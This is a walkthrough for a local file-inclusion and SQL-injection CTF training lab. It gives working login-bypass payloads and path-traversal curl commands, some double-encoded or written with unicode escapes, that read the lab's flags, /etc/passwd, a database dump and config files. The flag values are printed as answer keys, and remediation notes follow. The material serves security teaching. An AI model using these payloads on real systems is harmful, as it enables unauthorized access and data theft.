# 🧨 File Inclusion CTF — Lab Payloads & Walkthrough

Verified working payloads for the local lab, confirmed against the running containers and cross-checked with the controller source (`ChallengesController.java`).

- **Base URL:** `http://localhost` (nginx :80 → `file-inclusion-ctf:8080`)
- **Parameter (all endpoints):** `filename`
- **File root:** every read is resolved relative to `uploads/`, so `../` climbs into `/app`.
- **🚩 Flags:** each level has its **own** flag file in `/app`, mounted from `./flags/` — so every lab yields a different flag:

  | Level | Endpoint | Flag file | Value |
  |---|---|---|---|
  | 0 | `/` (login) | `flags/flag_login.txt` | `CTF{8ee4d84cbeef15123c24791da26006d9}` |
  | 1 | `/dr-strange` | `../flag1.txt` | `CTF{75c4bcd59149b3004345e414c325f3b6}` |
  | 2 | `/captain-america` | `../flag2.txt` | `CTF{234b5a3edf97aa319646be27d8a89db0}` |
  | 3 | `/deadpool` | `../flag3.txt` | `CTF{2c7c8d5ec9db726a120b290922222e47}` |
  | 4 | `/goku` | `../flag4.txt` | `CTF{fb4f3b1240b02c9c9efd10a01777d13f}` |

  > 🔄 **Re-randomize:** `for i in 1 2 3 4; do printf 'CTF{%s}\n' "$(openssl rand -hex 16)" > flags/flag$i.txt; done` — values update live (no restart needed; files are bind-mounted `:ro`).

> ⚠️ Authorized use only — this is a deliberately vulnerable training lab running on your own machine.

---

## Challenge 0 — `/` login page (SQL Injection auth bypass)

The front door is a login form (PHP + SQLite). It builds its query by **string concatenation**, with no parameterization:

```php
$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
```

The `admin` account has a strong random password, so the only way in is injection. Any payload that makes the `WHERE` clause always-true (or comments out the password check) logs you in and reveals the flag.

**Bypass payloads** (put in the **username** field):

| Payload | How it works |
|---|---|
| `admin'-- ` | Closes the string, comments out ` AND password=...`. Logs in as `admin`. |
| `' OR '1'='1` | Makes the whole clause true; returns the first row (`admin`). |
| `admin'/*` | Comment-based variant. |

**Reproduce with curl:**
```bash
# admin' --  (comment out the password check)
curl -s -X POST "http://localhost/" \
  --data-urlencode "username=admin'-- -" \
  --data-urlencode "password=x" | grep -o 'CTF{[^}]*}'

# ' OR '1'='1  (tautology, in both fields)
curl -s -X POST "http://localhost/" \
  --data-urlencode "username=' OR '1'='1" \
  --data-urlencode "password=' OR '1'='1" | grep -o 'CTF{[^}]*}'
```

**In the browser:** open <http://localhost/>, enter `admin'-- ` as the username, anything as the password, and submit. The page echoes the executed SQL on failed attempts (error-based hinting) and, on success, links straight to the file-inclusion challenges.

**Why it fails / remediation:** never concatenate input into SQL. Use parameterized queries / prepared statements (`WHERE username = ? AND password = ?`), store only salted password **hashes** (bcrypt/argon2), and verify with a constant-time compare.

---

## How the app decodes input (the key insight)

Spring **URL-decodes the query parameter once** before your code ever sees it. Each level then does something *else* on top of that single decode:

| Endpoint | "Level" | Protection | Bypass mechanic |
|---|---|---|---|
| `/dr-strange` | 1 | None | Plain `../` |
| `/captain-america` | 2 | `filename.replace("../","")` — single, non-recursive pass | `....//` collapses back to `../` |
| `/deadpool` | 3 | Blacklist on the (already Spring-decoded) string, **then decodes again** | Double URL-encoding |
| `/goku` | 4 | Decodes `\uXXXX` unicode escapes via `Properties` | Unicode escapes |

> Note: the README's level→hero labels don't match the code's behavior. The table above reflects the **actual** controller logic.

---

## Level 1 — `/dr-strange` (no protection)

Reads `uploads/ + filename` directly. No filtering at all.

**Read the flag** (this level → `flag1.txt`)
```
http://localhost/dr-strange?filename=../flag1.txt
```
```bash
curl "http://localhost/dr-strange?filename=../flag1.txt"
```

**Read /etc/passwd**
```bash
curl "http://localhost/dr-strange?filename=../../../../../../etc/passwd"
```

Encoded slashes also work here (`..%2f..%2fflag.txt`, `%2e%2e%2fflag.txt`) since Spring decodes them before the read.

---

## Level 2 — `/captain-america` (dot-segment / broken sanitizer)

Source: `filename.replace("../","")` — runs **once** and is **not** re-applied to the result. So a payload that *becomes* `../` after one removal survives.

`....//` → the inner `../` is stripped → what remains is `../`.

**Read the flag** (this level → `flag2.txt`)
```
http://localhost/captain-america?filename=....//flag2.txt
```
```bash
curl "http://localhost/captain-america?filename=....//flag2.txt"
```

**Read /etc/passwd**
```bash
curl "http://localhost/captain-america?filename=....//....//....//....//....//....//etc/passwd"
```

---

## Level 3 — `/deadpool` (blacklist + double decode)

Source order: **(1)** blacklist-check the incoming string, **(2)** `URLDecoder.decode(...)`, **(3)** read.
Blacklist: `../  ..\  ..  passwd  shadow  hosts  config  flag.txt` (case-insensitive).

Because Spring already decoded once, single-encoding (`%2e%2e%2f`) arrives as literal `../` and is blocked. You must **double-encode** so the string that reaches the blacklist contains no forbidden substring, and the app's second decode reconstructs the traversal. The words `flag.txt` / `passwd` must be encoded too (they're on the blacklist).

Encoding key: `../` → `%252e%252e%252f` · `passwd` → `%2570%2561%2573%2573%2577%2564`
(`flag3.txt` is not on the blacklist, so only the `../` needs double-encoding.)

**Read the flag** (this level → `flag3.txt`)
```
http://localhost/deadpool?filename=%252e%252e%252fflag3.txt
```
```bash
curl "http://localhost/deadpool?filename=%252e%252e%252fflag3.txt"
```

**Read /etc/passwd**
```bash
curl "http://localhost/deadpool?filename=%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252f%2570%2561%2573%2573%2577%2564"
```

---

## Level 4 — `/goku` (unicode escape decode)

Source: `decodeUnicode()` loads `key=<input>` into a `java.util.Properties`, which interprets `\uXXXX` escapes; the result is then `resolve().normalize()`-d and read.

`.` = `.` and `/` = `/`, so `../` = `../`.

When sent over HTTP the backslash must be URL-encoded as `%5c`.

**Read the flag** (this level → `flag4.txt`)
```
http://localhost/goku?filename=%5cu002e%5cu002e%5cu002fflag4.txt
```
```bash
curl "http://localhost/goku?filename=%5cu002e%5cu002e%5cu002fflag4.txt"
```
(In a browser you can paste `../flag4.txt` directly.)

**Read /etc/passwd**
```bash
curl "http://localhost/goku?filename=%5cu002e%5cu002e%5cu002f%5cu002e%5cu002e%5cu002f%5cu002e%5cu002e%5cu002f%5cu002e%5cu002e%5cu002f%5cu002e%5cu002e%5cu002f%5cu002e%5cu002e%5cu002fetc%5cu002fpasswd"
```

---

## Other interesting files to loot

All reachable through any working level (shown here via `/dr-strange`). They live in `/app`, i.e. `../<name>`:

```bash
curl "http://localhost/dr-strange?filename=../db_backup.sql"      # DB dump
curl "http://localhost/dr-strange?filename=../passwd"             # planted passwd file
curl "http://localhost/dr-strange?filename=../startup.sh"         # startup script
curl "http://localhost/dr-strange?filename=../nginx.conf"         # internal nginx config
curl "http://localhost/dr-strange?filename=../secret/"            # secret directory
curl "http://localhost/dr-strange?filename=../../../../../../etc/passwd"   # real system file
```

The author's own hint list is served at `http://localhost/hints`.

---

## Challenge objectives → where they're met

- **🔍 Find & read the flag** → each level has its own file: `../flag1.txt` … `../flag4.txt` (see the flag table at the top).
- **🧠 Bypass techniques** → dot-collapse (`....//`), double-encoding, unicode escapes above.
- **🚧 Blacklist limitations** → Level 3 shows a blacklist defeated purely by encoding order.
- **🛠️ Path-traversal variants** → encoded slashes, mixed dots, unicode, double-decode all demonstrated.

---

## Why each defense fails (remediation notes)

- **Blacklists are enumerate-the-bad** — encoding, unicode, and normalization order always leave gaps.
- **Single-pass string replacement** (`replace("../","")`) is defeated by overlapping/nested sequences.
- **Decode order matters** — validating *before* the final decode validates the wrong string.

**Do instead:** canonicalize first (`Path.normalize()` / `toRealPath()`), then **whitelist** — assert the resolved path is inside the intended base directory (`resolved.startsWith(baseDir)`) and, ideally, allow only a known set of filenames. Never build a filesystem path by concatenating user input.
